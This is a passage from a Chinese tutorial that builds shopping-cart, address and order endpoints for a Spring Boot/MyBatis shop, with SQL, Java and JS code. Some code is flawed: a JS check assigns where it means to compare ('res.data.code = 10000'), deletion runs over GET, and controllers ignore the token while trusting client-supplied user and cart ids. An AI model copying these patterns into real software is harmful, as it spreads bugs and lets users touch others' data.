  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartNum&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_props&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuProps&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImg&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;original_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;originalPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sell_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sellPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectShopcartByUserId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ShoppingCartVOMap&quot;</span>&gt;</span>
  select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
   c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name
  from shopping_cart c
  INNER JOIN product p
  INNER JOIN product_img i
  INNER JOIN product_sku s
  ON c.product_id = p.product_id
  and i.item_id=p.product_id
  and c.sku_id=s.sku_id
  where user_id = #&#123;userId&#125;
  and i.is_main=1
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Transactional(propagation = Propagation.SUPPORTS)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">listShoppingCartsByUserId</span><span class="hljs-params">(<span class="hljs-type">int</span> userId)</span> &#123;
    List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByUserId(userId);
    <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, list);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>


</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span>
<span class="hljs-meta">@ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;用户ID&quot;,required = true)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">list</span><span class="hljs-params">(Integer userId,<span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span>&#123;
    <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> shoppingCartService.listShoppingCartsByUserId(userId);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>


</li>
<li></li>
</ul>
<h4 id="更新购物车"><a href="#更新购物车" class="headerlink" title="更新购物车"></a>更新购物车</h4><p>更新购物车发送的请求如下，由分析可以看出url的格式如下，并且发送的是put请求</p>
<pre><code class="hljs awk"><span class="hljs-regexp">/shopcart/u</span>pdate<span class="hljs-regexp">/&#123;cartId&#125;/</span>&#123;num&#125;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714105311322.png" alt="image-20220714105311322"></p>
<ul>
<li><p>sql</p>
<p>使用update方法对对应的购物车记录进行修改即可</p>
<pre><code class="hljs routeros">update shopping_cart <span class="hljs-built_in">set</span> <span class="hljs-attribute">cart_num</span>=3 where <span class="hljs-attribute">cart_id</span>=1</code></pre>


</li>
<li><p>dao</p>
<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectShopcartByUserId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ShoppingCartVOMap&quot;</span>&gt;</span>
  select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
   c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name
  from shopping_cart c
  INNER JOIN product p
  INNER JOIN product_img i
  INNER JOIN product_sku s
  ON c.product_id = p.product_id
  and i.item_id=p.product_id
  and c.sku_id=s.sku_id
  where user_id = #&#123;userId&#125;
  and i.is_main=1
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateCartnumByCartid&quot;</span>&gt;</span>
  update shopping_cart set cart_num=#&#123;cartNum&#125; where cart_id=#&#123;cartId&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span></code></pre>

<p>mapper</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateCartnumByCartid</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;cartId&quot;)</span> <span class="hljs-type">int</span> cartId,</span>
<span class="hljs-params">                                 <span class="hljs-meta">@Param(&quot;cartNum&quot;)</span> <span class="hljs-type">int</span> cartNum)</span>;</code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">updateCartNum</span><span class="hljs-params">(<span class="hljs-type">int</span> cartId, <span class="hljs-type">int</span> cartNum)</span> &#123;
    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> shoppingCartMapper.updateCartnumByCartid(cartId, cartNum);
    <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK,<span class="hljs-string">&quot;update success&quot;</span>,<span class="hljs-literal">null</span>);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO,<span class="hljs-string">&quot;update fail&quot;</span>,<span class="hljs-literal">null</span>);
    &#125;
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java">
<span class="hljs-meta">@PutMapping(&quot;/update/&#123;cid&#125;/&#123;cnum&#125;&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">updateNum</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;cid&quot;)</span> Integer cartId,</span>
<span class="hljs-params">                          <span class="hljs-meta">@PathVariable(&quot;cnum&quot;)</span> Integer cartNum,</span>
<span class="hljs-params">                          <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span> String token)</span>&#123;
    <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> shoppingCartService.updateCartNum(cartId, cartNum);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre></li>
</ul>
<p>获取购物车列表信息</p>
<blockquote>
<p>当点击结算时，页面会跳转到结算页面，这里依然需要显示订单中的信息，但是这里需要的是批量结算，所以需要批量获取</p>
</blockquote>
<p>从前端发起的请求可以看到cids为本次请求的所有购物车订单</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714124912790.png" alt="image-20220714124912790"></p>
<p>响应结果如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714125042189.png" alt="image-20220714125042189"></p>
<p>从中可以看到与获取购物车列表使用到的sql语句大致相同</p>
<ul>
<li><p>sql</p>
<pre><code class="hljs mysql">select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock
from shopping_cart c
INNER JOIN product p
INNER JOIN product_img i
INNER JOIN product_sku s
ON c.product_id = p.product_id
and i.item_id=p.product_id
and c.sku_id=s.sku_id
where i.is_main=1 and c.cart_id in (6,7)</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714125332136.png" alt="image-20220714125332136"></p>
</li>
<li><p>dao</p>
<p>创建新的实体类保存结果</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 新增 productName、productImg</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShoppingCartVO</span> &#123;
    <span class="hljs-keyword">private</span> Integer cartId;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> String skuId;
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String cartNum;
    <span class="hljs-keyword">private</span> String cartTime;
    <span class="hljs-keyword">private</span> BigDecimal productPrice;
    <span class="hljs-keyword">private</span> String skuProps;

    <span class="hljs-keyword">private</span> String productName;
    <span class="hljs-keyword">private</span> String productImg;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> originalPrice;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> sellPrice;
    <span class="hljs-keyword">private</span> String skuName;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> skuStock;  <span class="hljs-comment">//库存</span>
&#125;</code></pre>

<p>Mapper中代码</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;ShoppingCartVO&gt; <span class="hljs-title function_">selectShopcartByCids</span><span class="hljs-params">(List&lt;Integer&gt; cids)</span>;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ShoppingCartVOMap2&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartNum&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_props&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuProps&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImg&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;original_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;originalPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sell_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sellPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;stock&quot;</span>  <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuStock&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectShopcartByCids&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ShoppingCartVOMap2&quot;</span>&gt;</span>
  select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
  c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock
  from shopping_cart c
  INNER JOIN product p
  INNER JOIN product_img i
  INNER JOIN product_sku s
  ON c.product_id = p.product_id
  and i.item_id=p.product_id
  and c.sku_id=s.sku_id
  where i.is_main=1 and c.cart_id in
  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;cids&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;cid&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;(&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;)&quot;</span>&gt;</span>
      #&#123;cid&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">listShoppingCartsByCids</span><span class="hljs-params">(String cids)</span> &#123;
    <span class="hljs-comment">// 将前端请求携带的字符串转换成int数组 </span>
    List&lt;Integer&gt; cartIds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    String[] strings = cids.split(<span class="hljs-string">&quot;,&quot;</span>);
    <span class="hljs-keyword">for</span> (String string : strings) &#123;
        cartIds.add(Integer.parseInt(string));
    &#125;
    List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByCids(cartIds);
    <span class="hljs-keyword">return</span> ResultVO.success(list);
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/listbycids&quot;)</span>
<span class="hljs-meta">@ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;选择的购物车记录的id&quot;,required = true)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">listByCids</span><span class="hljs-params">(String cids, <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span>&#123;
    <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> shoppingCartService.listShoppingCartsByCids(cids);
    <span class="hljs-keyword">return</span> resultVO;
&#125;
</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714130445019.png" alt="image-20220714130445019"></p>
</li>
</ul>
<h4 id="删除购物车"><a href="#删除购物车" class="headerlink" title="删除购物车"></a>删除购物车</h4><ul>
<li><p>sql</p>
<p>删除数据时，可以批量删除也可以是单个删除，因此使用下面的sql语句</p>
<pre><code class="hljs mysql">delete from shopping_cart where cart_id IN (10,11)</code></pre>
</li>
<li><p>dao</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">deleteShopcartByCids</span><span class="hljs-params">(List&lt;Integer&gt; cids)</span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteShopcartByCids&quot;</span>&gt;</span>
  delete from shopping_cart where cart_id in
  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;cids&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;cid&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;(&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;)&quot;</span>&gt;</span>
    #&#123;cid&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">deleteShoppingCartsByCids</span><span class="hljs-params">(String cids)</span> &#123;
    <span class="hljs-comment">// 将前端请求携带的字符串转换成int数组</span>
    List&lt;Integer&gt; cartIds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    String[] strings = cids.split(<span class="hljs-string">&quot;,&quot;</span>);
    <span class="hljs-keyword">for</span> (String string : strings) &#123;
        cartIds.add(Integer.parseInt(string));
    &#125;
    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> shoppingCartMapper.deleteShopcartByCids(cartIds);
    <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span>)&#123;
        <span class="hljs-keyword">return</span> ResultVO.success();
    &#125;<span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;删除失败！&quot;</span>);
    &#125;
&#125;</code></pre>


</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/delete&quot;)</span>
<span class="hljs-meta">@ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;选择的购物车记录的id&quot;,required = true)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">deletebycids</span><span class="hljs-params">(String cids, <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span>&#123;
    <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> shoppingCartService.deleteShoppingCartsByCids(cids);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>
</li>
<li><p>前端代码</p>
<p>由于该功能没有再前端实现因此在shopcart.html页面中加入如下js代码	</p>
<pre><code class="hljs js"><span class="hljs-attr">deleteByIds</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">opts</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span>) &#123;
        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要购买的商品！&quot;</span>)
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-comment">//1.获取选择购物车记录的id [0,2]  ---&gt;  cartId 8   cartId 10 --- 8,10,</span>
        <span class="hljs-keyword">var</span> cids = <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">opts</span>.<span class="hljs-property">length</span>; i++) &#123;
            <span class="hljs-keyword">var</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">opts</span>[i];
            <span class="hljs-keyword">var</span> cartId = <span class="hljs-variable language_">this</span>.<span class="hljs-property">shopcarts</span>[index].<span class="hljs-property">cartId</span>;
            <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">opts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) &#123;
                cids = cids + cartId + <span class="hljs-string">&quot;,&quot;</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                cids = cids + cartId;
            &#125;
        &#125;
        <span class="hljs-keyword">var</span> url = baseUrl + <span class="hljs-string">&quot;shopcart/delete/?cids=&quot;</span> + cids;
        <span class="hljs-title function_">axios</span>(&#123;
            <span class="hljs-attr">url</span>: url,
            <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;get&quot;</span>,
            <span class="hljs-attr">headers</span>: &#123;
                <span class="hljs-attr">token</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span>
            &#125;
        &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
            <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> = <span class="hljs-number">10000</span>) &#123;
                <span class="hljs-comment">//重新刷新购物车</span>
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getShoppingCartList</span>();
            &#125;
        &#125;);
    &#125;
&#125;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714134933507.png" alt="image-20220714134933507"></p>
<p>接口测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714135115137.png" alt="image-20220714135115137"></p>
</li>
</ul>
<h3 id="1-10-收货地址"><a href="#1-10-收货地址" class="headerlink" title="1.10 收货地址"></a>1.10 收货地址</h3><h4 id="获取收获地址"><a href="#获取收获地址" class="headerlink" title="获取收获地址"></a>获取收获地址</h4><p>直接根据用户id即可获取到收获地址，所以这里直接使用tkMapper生成的即可。</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Transactional(propagation = Propagation.SUPPORTS)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">listAddrsByUid</span><span class="hljs-params">(<span class="hljs-type">int</span> userId)</span> &#123;
    <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(UserAddr.class);
    Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
    criteria.andEqualTo(<span class="hljs-string">&quot;userId&quot;</span>,userId);
    criteria.andEqualTo(<span class="hljs-string">&quot;status&quot;</span>,<span class="hljs-number">1</span>);

    List&lt;UserAddr&gt; userAddrs = userAddrMapper.selectByExample(example);
    <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, userAddrs);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span>
<span class="hljs-meta">@ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;用户ID&quot;,required = true)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">list</span><span class="hljs-params">(Integer userId,<span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span>&#123;
    <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> userAddrService.listAddrsByUid(userId);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre></li>
</ul>
<h3 id="1-11-订单业务"><a href="#1-11-订单业务" class="headerlink" title="1.11 订单业务"></a>1.11 订单业务</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714172108540.png" alt="image-20220714172108540"></p>
<h4 id="订单添加接口"><a href="#订单添加接口" class="headerlink" title="订单添加接口"></a>订单添加接口</h4><ul>
<li><p>数据库操作</p>
<ul>
<li>根据收获地址的id，获取地址信息</li>
<li>根据购物车id，查询购物车的详细信息（关联商品名称，sku，库存，商品图片，价格），用于生成订单快照</li>
<li>保存订单</li>
<li>保存商品快照</li>
<li>修改库存</li>
</ul>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 保存订单业务</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cids</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> order</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> SQLException</span>
<span class="hljs-comment">     */</span>
<span class="hljs-meta">@Transactional</span>
